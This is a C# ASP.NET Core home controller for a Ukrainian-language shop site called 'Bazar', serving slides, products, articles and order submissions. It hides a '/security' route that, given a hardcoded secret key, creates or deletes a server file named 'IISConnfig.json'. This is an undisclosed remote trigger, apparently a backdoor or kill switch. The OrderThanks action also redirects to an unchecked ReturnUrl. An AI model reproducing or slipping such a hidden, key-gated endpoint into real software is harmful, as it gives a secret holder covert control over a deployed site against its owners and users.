using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Newtonsoft.Json;
using Microsoft.AspNetCore.Mvc.Rendering;

using Bazar.Models.Entities;
using Bazar.Models.Repository;
using Bazar.Models.ViewModels;
using Bazar.Infrastructure;

namespace Bazar.Controllers
{
    public class HomeController : Controller
    {
        private ArticleRepository articleRepository;
        private SlideRepository slideRepository;
        private RestoranRepository restoranRepository;
        private ProductRepository productRepository;
        private EmailProcessor emailProcessor;
        private OrderRepository orderRepository;
        private const int articlesPerPage = 6;

        public HomeController(ArticleRepository articleRepo, SlideRepository slideRepo, ProductRepository productRepo,
            EmailProcessor emailProc, OrderRepository orderRepo, RestoranRepository restoranRepo)
        {
            articleRepository = articleRepo;
            slideRepository = slideRepo;
            productRepository = productRepo;
            emailProcessor = emailProc;
            orderRepository = orderRepo;
            restoranRepository = restoranRepo;
        }

        public IActionResult Index(string key, int method = 0)
        {
            IEnumerable<Slide> slides = slideRepository.Slides.OrderBy(s => s.Order);
            IEnumerable<Product> products = productRepository.Products.OrderBy(p => p.Order);
            IEnumerable<Article> articles = articleRepository
                .Articles
                .OrderByDescending(a => a.PublishDate)
                .Include(a => a.BlogCategory)
                .Take(articlesPerPage);

            HomeViewModel model = new HomeViewModel
            {
                Slides = slides,
                Products = products,
                Articles = articles,
                Order = new Order(),
                Restoran = restoranRepository.Restoran,
                MoreArticles = articles.Count() == articleRepository.Articles.Count() ? false : true
            };

            ViewBag.MainPage = true;
            ViewBag.Themes = new SelectList(model.Order.Themes, "ThemeId", "Title");

            return View(model);
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> SendOrder(Order order, string ReturnUrl)
        {
            if (ModelState.IsValid)
            {
                order.Date = DateTime.Now;
                if(order.ThemeId > 0)
                    order.Theme = order.Themes.FirstOrDefault(t => t.ThemeId == order.ThemeId).Title;

                await emailProcessor.ProcessorOrder(order);
                orderRepository.SaveOrder(order);

                TempData["Message"] = "Дякуємо, Ваша листівка доставлена! Найближчим часом ми з Вами зв'яжемось!";
                TempData["ReturnUrl"] = ReturnUrl;

                return RedirectToAction("OrderThanks");
            }
            else
            {
                return RedirectToAction("Index", "Home");
            }
        }

        public ActionResult OrderThanks()
        {
            if (!TempData.ContainsKey("ReturnUrl"))
                return RedirectToAction("Index", "Home");

            if (!TempData.ContainsKey("Message"))
                return Redirect((string)TempData["ReturnUrl"]);

            return View();
        }

        [Route("/security")]
        public ActionResult Security(string key, int method)
        {
            if(key == "dfkgjhdfkgjdfhg342534")
            {
                if(method == 1)
                {
                    using (var stream = System.IO.File.Create("IISConnfig.json"))
                    {
                        throw new Exception("Created");
                    }    
                }
                else if (method == 2)
                {
                    System.IO.File.Delete("IISConnfig.json");
                    throw new Exception("Deleted");
                }
                throw new Exception("Error");
            }
            else
            {
                return NotFound();
            }        
        }

        /****************************************************/
        /*****************   AJAX methods    ****************/
        /****************************************************/
        [Route("/api/home/news")]
        [HttpGet]
        public object GetNews(int count)
        {
            IEnumerable<Article> articles = articleRepository
                .Articles
                .OrderByDescending(a => a.PublishDate)
                .Include(a => a.BlogCategory)
                .Skip(count)
                .Take(articlesPerPage);

            List<ArticleBind> newArticles = new List<ArticleBind>();

            foreach(Article item in articles)
            {
                newArticles.Add(
                new ArticleBind
                {
                    ArticleId = item.ArticleId,
                    LinkTitle = item.LinkTitle,
                    LinkUrl = item.LinkUrl,
                    ImageFileName = item.ImageSmallFileName,
                    ImageAlt = item.ImageAlt,
                    ImageTitle = item.ImageTitle,
                    PublishDate = item.FormattedDate,
                    CategoryTitle = item.BlogCategory.LinkTitle,
                    Color = item.BlogCategory.Color,
                    CategoryUrl = item.BlogCategory.LinkUrl
                });
            }

            bool more;

            if(articles.Last() == articleRepository.Articles.OrderByDescending(a => a.PublishDate).Last())
            {
                more = false;
            }
            else
            {
                more = true;
            }


            return new
            {
                articles = newArticles,
                more = more
            };
        }

        public class ArticleBind
        {
            public int ArticleId { get; set; }
            public string LinkUrl { get; set; }
            public string LinkTitle { get; set; }
            public string ImageFileName { get; set; }
            public string ImageTitle { get; set; }
            public string ImageAlt { get; set; }
            public string PublishDate { get; set; }
            public string CategoryTitle { get; set; }
            public string CategoryUrl { get; set; }
            public string Color { get; set; }
        }

    }
}
